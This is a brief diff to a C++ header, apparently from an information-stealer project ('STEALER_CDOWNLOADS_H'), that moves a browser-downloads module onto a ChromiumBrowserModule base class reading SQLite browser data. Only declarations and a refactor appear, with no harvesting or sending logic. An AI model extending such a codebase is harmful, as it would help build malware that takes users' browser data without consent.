@@ -6,8 +6,8 @@
 #define STEALER_CDOWNLOADS_H
 
 
-#include "../../BrowserModule.h"
 #include "sqlite3.h"
+#include "../ChromiumBrowserModule.h"
 
 struct Download {
     std::string url;
@@ -15,7 +15,7 @@ struct Download {
     long long total_bytes;
 };
 
-class CDownloads : public BrowserModule {
+class CDownloads : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
 private:
